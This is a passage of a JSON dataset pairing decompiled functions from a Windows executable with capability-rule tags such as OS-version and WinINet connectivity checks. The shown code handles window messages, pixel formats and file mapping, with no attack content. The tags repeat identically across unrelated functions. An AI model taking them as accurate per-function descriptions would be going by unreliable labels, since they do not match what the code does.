{\n                if ((*(iVar2 + 0x50) == NULL) || (*(iVar2 + 0x50) != puStackY1116)) {\n                    *(iVar2 + 0x50) = puStackY1116;\n                }\n                if (*(iVar2 + 0x70) != '\\0') {\n                    fcn.004293dc();\n                }\n            }\n            if (*(iVar2 + 0x70) == '\\0') {\n                fcn.0041b6f0();\n                fcn.0041b6f0();\n                if ((8 < *(iVar2 + 0x3e)) && ((*(iVar2 + 0x40) & 3) != 0)) {\n                    fcn.0041b6f0();\n                }\n            }\n            else {\n                fcn.0041b6f0();\n                fcn.0041b6f0();\n            }\n            fcn.0041b6f0();\n            fcn.0041b6f0();\n        }\n    }\n    else {\n        uVar4 = (***puVar1)();\n        if (param_1 != '\\0') {\n            fcn.0041b6f0(uVar4);\n        }\n        (****(*(in_EAX + 0x28) + 0x6c))();\n        (**(*param_2 + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 986
    },
    "0042e848": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042e848(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uStack32;\n    int16_t iVar2;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if ((*(iVar1 + 8) == 0) && (*(iVar1 + 0xc) != 0)) {\n        iVar2 = 0;\n        fcn.0041b4ac(0, 0);\n        uStack32 = 0x42e877;\n        fcn.0041b6b8();\n        if (iVar2 != 0) {\n            if (iVar2 == 1) {\n                uStack32 = 6;\n                fcn.004299b0(iVar1 + 0x10, in_EAX + 0x2c);\n            }\n            else {\n                uStack32 = 0x42e8b3;\n                fcn.00428e50();\n            }\n        }\n        *(iVar1 + 8) = uStack32;\n    }\n    return;\n}\n",
        "token_count": 234
    },
    "0042e8c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042e8c0(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ah;\n    uint var_4h;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if (*(iVar1 + 0xc) == 0) {\n        if (*(iVar1 + 8) == 0) {\n            puStack32 = 0x42e8e3;\n            fcn.00428e50();\n        }\n        puStack32 = 0x42e8ef;\n        uVar2 = fcn.00404610();\n        uStack36 = 0x42e94d;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        iVar3 = fcn.0042e80c();\n        if (iVar3 == *0x4aaa34) {\n            fcn.00403ae4();\n            fcn.0041b6f0();\n        }\n        else {\n            fcn.0042e80c();\n            fcn.00429f00();\n        }\n        *in_FS_OFFSET = uStack40;\n        *(iVar1 + 0xc) = uVar2;\n    }\n    return;\n}\n",
        "token_count": 325
    },
    "0042eed8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042eed8(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint *var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x42eef0;\n    fcn.0042eec0();\n    uStack32 = 0x42ef79;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    for (var_8h = *(in_EAX + 4); (var_8h != NULL && ((param_2 != var_8h[2] || (param_1 != var_8h[3]))));\n        var_8h = *var_8h) {\n    }\n    if (var_8h == NULL) {\n        puStack28 = &stack0xfffffffc;\n        puVar1 = fcn.00402ef0();\n        *puVar1 = *(in_EAX + 4);\n        uVar2 = fcn.0042ef8c();\n        puVar1[1] = uVar2;\n        puVar1[2] = param_2;\n        puVar1[3] = param_1;\n        *(in_EAX + 4) = puVar1;\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x42ef80;\n    uStack32 = 0x42ef78;\n    fcn.0042eecc();\n    return;\n}\n",
        "token_count": 372
    },
    "0042f10c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042f10c(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (*0x4aaa78 != 0) {\n        uVar1 = fcn.0042767c();\n        fcn.0042767c(uVar1);\n        iVar2 = fcn.0042eed8();\n        return *(iVar2 + 4);\n    }\n    return 0;\n}\n",
        "token_count": 94
    },
    "0042f2ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042f2ac(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar2 = (*(in_EAX + 0x2c) + 1U) % *(in_EAX + 0x30);\n    puStack28 = 0x42f2e5;\n    (****(*(in_EAX + 0x28) + 0x1c + uVar2 * 0x20))();\n    uStack32 = 0x42f395;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n    iVar1 = *(in_EAX + 0x28) + uVar2 * 0x20;\n    puStack28 = &stack0xfffffffc;\n    if (*param_1 != *(iVar1 + 4)) {\n        *(iVar1 + 4) = *param_1;\n        puStack28 = &stack0xfffffffc;\n        fcn.00402f24();\n    }\n    *(iVar1 + 8) = *(in_EAX + 0x18);\n    *(iVar1 + 0xc) = *(in_EAX + 0x1c);\n    if (*(in_EAX + 0xb) == '\\0') {\n        *(iVar1 + 0x10) = *(in_EAX + 0x20);\n    }\n    else {\n        *(iVar1 + 0x10) = 0;\n    }\n    *(iVar1 + 0x18) = 0;\n    fcn.004030ec();\n    *(in_EAX + 0x2c) = uVar2;\n    fcn.00422b44();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x42f39c;\n    uStack32 = 0x42f394;\n    (**(**(*(in_EAX + 0x28) + 0x1c + uVar2 * 0x20) + 4))();\n    return;\n}\n",
        "token_count": 529
    },
    "0042f3e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042f3e0(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack32;\n    int32_t iStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    iStack32 = *param_2;\n    if (iStack32 == *(in_EAX + 0x38)) {\n        iStack28 = 0x42f45a;\n        iStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &iStack32;\n        if (*(in_EAX + 10) == '\\0') {\n            *(in_EAX + 10) = 1;\n            fcn.0042fda8();\n            if (*(in_EAX + 0x42) != 0) {\n                (**(in_EAX + 0x40))();\n            }\n            *(in_EAX + 10) = 0;\n        }\n        *in_FS_OFFSET = iStack32;\n    }\n    else {\n        puStack24 = param_2[2];\n        iStack28 = param_2[1];\n        iVar1 = sub.user32.dll_DefWindowProcA(*(in_EAX + 0x34));\n        param_2[3] = iVar1;\n    }\n    return;\n}\n",
        "token_count": 316
    },
    "0042f49c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042f49c(void)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar3 = *(in_EAX + 0x30);\n    if (-1 < iVar3 + -1) {\n        iVar4 = 0;\n        do {\n            piVar1 = *(in_EAX + 0x28) + iVar4 * 0x20;\n            if ((0 < piVar1[1]) && (*piVar1 != 0)) {\n                fcn.00402f0c();\n            }\n            if (piVar1[5] != 0) {\n                fcn.00404640();\n            }\n            if (piVar1[7] != 0) {\n                fcn.00404640();\n            }\n            iVar2 = fcn.00422b5c();\n            piVar1[7] = iVar2;\n            *piVar1 = 0;\n            piVar1[1] = 0;\n            piVar1[5] = 0;\n            piVar1[2] = 0;\n            piVar1[3] = 0;\n            *(piVar1 + 6) = 0;\n            iVar4 = iVar4 + 1;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    return;\n}\n",
        "token_count": 319
    },
    "0042f730": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042f730(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    char cVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iVar4;\n    uint *arg_8h;\n    int32_t iStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    puStack52 = 0x42f74f;\n    var_ch = in_EAX;\n    var_4h = param_2;\n    fcn.004058ec();\n    uStack56 = 0x42f8c2;\n    iStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    *(var_ch + 0xc) = 0;\n    *(var_ch + 0x10) = 0;\n    *(var_ch + 0x14) = 0;\n    puStack52 = &stack0xfffffffc;\n    fcn.0040546c();\n    if (*(var_ch + 4) != 0) {\n        fcn.0042f6b4();\n    }\n    if (var_10h < -1) {\n        var_10h = -1;\n    }\n    *(var_ch + 0xb) = var_10h == -1;\n    uVar1 = fcn.00424974(&fcn.0042f730::var_14h, 0, var_10h == -1);\n    *(var_ch + 4) = uVar1;\n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffac;\n    iVar4 = 1;\n    uVar2 = fcn.004252c8(1, &fcn.0042f730::var_8h);\n    cVar3 = '\\x01' - ((uVar2 & 0x80000000) != 0);\n    *in_FS_OFFSET = iVar4;\n    if (cVar3 != '\\0') {\n        if (var_10h == -1) {\n            arg_8h = &fcn.0042f730::var_20h;\n            uVar2 = fcn.0042593c(arg_8h);\n            if ((uVar2 & 0x80000000) == 0) {\n                *(var_ch + 0x18) = var_18h;\n                *(var_ch + 0x1c) = var_1ch;\n                *(var_ch + 0x20) = var_20h;\n            }\n            else {\n                cVar3 = '\\0';\n            }\n        }\n        else {\n            arg_8h = 0x42f828;\n            cVar3 = fcn.00430184();\n        }\n    }\n    if (cVar3 == '\\0') {\n        fcn.0042f6b4();\n    }\n    else {\n        *(var_ch + 9) = 1;\n        fcn.004054c0();\n        fcn.00425a88(fcn.0042f2ac, var_ch);\n    }\n    *in_FS_OFFSET = arg_8h;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 778
    },
    "0042f8d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042f8d4(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (*(in_EAX + 0x1c4b) == '\\0') {\n        iVar2 = 0;\n        do {\n            uVar1 = fcn.00403440(iVar2);\n            *(in_EAX + 0x4c + iVar2 * 4) = uVar1;\n            uVar1 = fcn.00403440(iVar2);\n            *(in_EAX + 0x44c + iVar2 * 4) = uVar1;\n            uVar1 = fcn.00403440(iVar2);\n            *(in_EAX + 0x84c + iVar2 * 4) = uVar1;\n            uVar1 = fcn.00403440(iVar2);\n            *(in_EAX + 0xc4c + iVar2 * 4) = uVar1;\n            uVar1 = fcn.00403440(iVar2);\n            *(in_EAX + 0x104c + iVar2 * 4) = uVar1;\n            iVar2 = iVar2 + 1;\n        } while (iVar2 != 0x100);\n        fcn.00403ae4();\n        iVar2 = 0;\n        do {\n            *(in_EAX + 0x184b + iVar2) = iVar2;\n            iVar2 = iVar2 + 1;\n        } while (iVar2 != 0x100);\n        iVar2 = 0x100;\n        do {\n            *(in_EAX + 0x184b + iVar2) = 0xff;\n            iVar2 = iVar2 + 1;\n        } while (iVar2 != 0x400);\n        *(in_EAX + 0x1c4b) = 1;\n    }\n    return;\n}\n",
        "token_count": 416
    },
    "0042fda8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042fda8(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    int32_t var_4h;\n    \n    if (*(in_EAX + 0x24) != 0) {\n        puStack12 = 0x42fdd3;\n        var_4h = in_EAX;\n        fcn.0042fe3c();\n        if (*(*(var_4h + 0x24) + 0x50) < 1) {\n            puStack12 = 0x42fde4;\n            fcn.0042881c();\n            uStack16 = 0x42fe2f;\n            uStack20 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffec;\n            arg_8h = *(*(var_4h + 0x28) + 0x14 + *(var_4h + 0x2c) * 0x20);\n            puStack12 = &stack0xfffffffc;\n            fcn.004286fc(arg_8h);\n            *in_FS_OFFSET = arg_8h;\n            uStack16 = 0x42fe36;\n            uStack20 = 0x42fe2e;\n            fcn.00428a54();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 317
    },
    "0042fe3c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042fe3c(uint param_1, int32_t *param_2)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uint uVar5;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_5h;\n    \n    uStack44 = 0x430053;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    if ((*(param_2 + 6) != '\\0') || (*param_2 == 0)) goto code_r0x00430038;\n    if (param_2[5] == 0) {\n        iVar3 = fcn.0042cbe0();\n        param_2[5] = iVar3;\n    }\n    iVar3 = (**(*param_2[5] + 0x2c))();\n    if ((iVar3 != param_2[2]) || (iVar3 = (**(*param_2[5] + 0x20))(),  iVar3 != param_2[3])) {\n        fcn.0042e134();\n        (**(*param_2[5] + 0x40))();\n        (**(*param_2[5] + 0x34))();\n    }\n    bVar2 = false;\n    uVar5 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    iVar3 = param_2[4];\n    if (iVar3 < 0x3259555a) {\n        if (iVar3 == 0x32595559) goto code_r0x0042ff35;\n        if (iVar3 == 0) {\n            if (param_2[2] * param_2[3] * 3 == param_2[1]) {\n                fcn.0042d324();\n                fcn.004030ec();\n            }\n            else {\n                bVar2 = true;\n            }\n        }\n        else {\n            if ((iVar3 == 0x30323449) || (iVar3 == 0x32315659)) goto code_r0x0042ff54;\ncode_r0x0042ff7b:\n            bVar2 = true;\n        }\n    }\n    else {\n        if (iVar3 != 0x564e5559) {\n            if (iVar3 == 0x56555949) {\ncode_r0x0042ff54:\n                uVar1 = param_2[2] * param_2[3] * 3;\n                iVar3 = uVar1 >> 1;\n                if (iVar3 < 0) {\n                    iVar3 = iVar3 + ((uVar1 & 1) != 0);\n                }\n                if (iVar3 == param_2[1]) {\n                    fcn.0042fa34();\n                }\n                else {\n                    bVar2 = true;\n                }\n                goto code_r0x0042ff7d;\n            }\n            if (iVar3 != 0x56595559) goto code_r0x0042ff7b;\n        }\ncode_r0x0042ff35:\n        if (param_2[2] * param_2[3] * 2 == param_2[1]) {\n            fcn.0042fc2c();\n        }\n        else {\n            bVar2 = true;\n        }\n    }\ncode_r0x0042ff7d:\n    if (bVar2) {\n        if (param_2[4] != 0) {\n            fcn.004030ec();\n        }\n        uVar5 = 0x430074;\n        uStack44 = 0x42ffbd;\n        fcn.0042d1b4();\n        uStack44 = 0x42ffc6;\n        fcn.004288d8(uVar5);\n        uStack44 = 0x430090;\n        uStack48 = 0x42ffd6;\n        fcn.00409c6c();\n        uStack48 = 0;\n        fcn.004056d0();\n        fcn.00405800();\n        uVar5 = 0;\n        fcn.0042d1b4();\n        uVar4 = fcn.004289d8();\n        fcn.0042d1b4(uVar4);\n        fcn.004288d8(uVar5);\n    }\n    *(param_2 + 6) = 1;\n    *in_FS_OFFSET = uVar5;\ncode_r0x00430038:\n    *in_FS_OFFSET = uStack48;\n    uStack44 = 0x430052;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 1050
    },
    "004300bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004300bc(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    piVar1 = *(in_EAX + 0x28) + param_1 * 0x20;\n    puStack28 = 0x4300e8;\n    (***piVar1[7])();\n    uStack32 = 0x43015f;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if ((((*piVar1 != 0) && (0 < piVar1[2])) && (0 < piVar1[3])) && (0 < piVar1[1])) {\n        puStack28 = &fcn.004300bc::var_1h + 1;\n        fcn.0042fe3c();\n        if (*(piVar1 + 6) != '\\0') {\n            (**(*param_2 + 8))();\n            var_1h._0_1_ = 1;\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x430166;\n    uStack32 = 0x43015e;\n    (**(*piVar1[7] + 4))();\n    return;\n}\n",
        "token_count": 373
    },
    "00430184": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00430184(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    uchar *arg_8h;\n    uint uStack24;\n    uint uStack20;\n    uchar auStack16 [4];\n    \n    if (param_2 < -1) {\n        param_2 = -1;\n    }\n    if ((param_2 == -1) || (*(in_EAX + 0xb) != '\\0')) {\n        fcn.0042f6b4();\n        uVar1 = fcn.0042f730();\n    }\n    else {\n        uVar1 = 0;\n        fcn.00425860();\n        arg_8h = auStack16;\n        uVar2 = fcn.0042593c(arg_8h);\n        if ((uVar2 & 0x80000000) == 0) {\n            *(in_EAX + 0xb) = 0;\n            uVar1 = 1;\n            *(in_EAX + 0x18) = arg_8h;\n            *(in_EAX + 0x1c) = uStack24;\n            *(in_EAX + 0x20) = uStack20;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 294
    },
    "004302b8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004302b8(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*0x4aaa7c != 0) && (*(in_EAX + 5) != '\\0')) {\n        fcn.0042f6b4();\n        fcn.00404640();\n        *0x4aaa7c = 0;\n        *(in_EAX + 5) = 0;\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "004302ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004302ec(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x43035e;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (*0x4aaa7c != 0) {\n        fcn.00409c6c();\n        fcn.00405784();\n        cVar1 = fcn.0042f730();\n        if (cVar1 != '\\0') {\n            *(in_EAX + 5) = 1;\n        }\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x430365;\n    uStack28 = 0x43035d;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 230
    },
    "00430378": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00430378(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    uVar2 = 0;\n    if (*(in_EAX + 5) != '\\0') {\n        cVar1 = fcn.0042f688();\n        if (cVar1 != '\\0') {\n            uVar2 = fcn.00430174();\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 102
    },
    "0043159c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043159c(uint param_1, uint *param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack244;\n    uint uStack240;\n    uchar *puStack236;\n    int32_t iStack232;\n    int32_t iStack228;\n    uint uStack224;\n    uint uStack220;\n    uint uStack216;\n    int32_t iStack212;\n    uint uStack208;\n    uchar *puStack204;\n    int32_t iStack200;\n    int32_t iStack196;\n    uint uStack192;\n    uint uStack188;\n    uint uStack184;\n    uint uStack180;\n    int32_t iStack176;\n    uint uStack172;\n    uchar *puStack168;\n    uint uStack164;\n    uint uStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    uint var_78h;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint var_68h;\n    uint lpBaseAddress;\n    uint hFileMappingObject;\n    uint hObject;\n    uint var_4h;\n    \n    uStack140 = 0x4315b1;\n    cVar1 = fcn.0040a168();\n    if (cVar1 != '\\0') {\n        uStack140 = 0x4315c1;\n        fcn.00430ae8();\n        uStack140 = 0;\n        uStack144 = 0x8000080;\n        uStack148 = 3;\n        uStack152 = 0;\n        uStack156 = 3;\n        uStack160 = 0x80000000;\n        uStack164 = 0x4315da;\n        uStack164 = fcn.004058fc();\n        puStack168 = 0x4315e0;\n        iVar2 = sub.kernel32.dll_CreateFileA_1();\n        if (iVar2 != -1) {\n            uStack172 = 0x4316bc;\n            iStack176 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff50;\n            uStack180 = 0;\n            uStack184 = 0;\n            uStack188 = 0;\n            uStack192 = 2;\n            iStack196 = 0;\n            puStack204 = 0x43160e;\n            iStack200 = iVar2;\n            puStack168 = &stack0xfffffffc;\n            iVar3 = sub.kernel32.dll_CreateFileMappingA();\n            if (iVar3 == 0) {\n                *in_FS_OFFSET = iStack200;\n                uStack192 = 0x4316c3;\n                iStack200 = 0x4316bb;\n                iStack196 = iVar2;\n                sub.kernel32.dll_CloseHandle_1();\n                return;\n            }\n            uStack208 = 0x43169e;\n            iStack212 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff2c;\n            uStack216 = 0;\n            uStack220 = 0;\n            uStack224 = 0;\n            iStack228 = 4;\n            puStack236 = 0x43163a;\n            iStack232 = iVar3;\n            puStack204 = &stack0xfffffffc;\n            iVar4 = sub.kernel32.dll_MapViewOfFile();\n            if (iVar4 != 0) {\n                uStack240 = 0x431680;\n                iStack244 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffff0c;\n                puStack236 = &stack0xfffffffc;\n                sub.kernel32.dll_GetFileSize_1(iVar2, 0);\n                fcn.00430b0c();\n                *in_FS_OFFSET = iVar2;\n                iStack244 = 0x431687;\n                sub.kernel32.dll_UnmapViewOfFile(iVar4);\n                return;\n            }\n            *in_FS_OFFSET = iStack232;\n            uStack224 = 0x4316a5;\n            iStack232 = 0x43169d;\n            iStack228 = iVar3;\n            sub.kernel32.dll_CloseHandle_1();\n            return;\n        }\n        puStack168 = 0x4316ce;\n        fcn.00430ba0();\n        *param_2 = var_78h;\n        param_2[1] = uStack120;\n        param_2[2] = uStack116;\n        param_2[3] = uStack112;\n    }\n    return;\n}\n",
        "token_count": 1018
    },
    "00431cc8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00431cc8(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xb8) != 0) {\n        fcn.0043e58c();\n        *(in_EAX + 0xb8) = 0;\n    }\n    return;\n}\n",
        "token_count": 69
    },
    "00431cec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
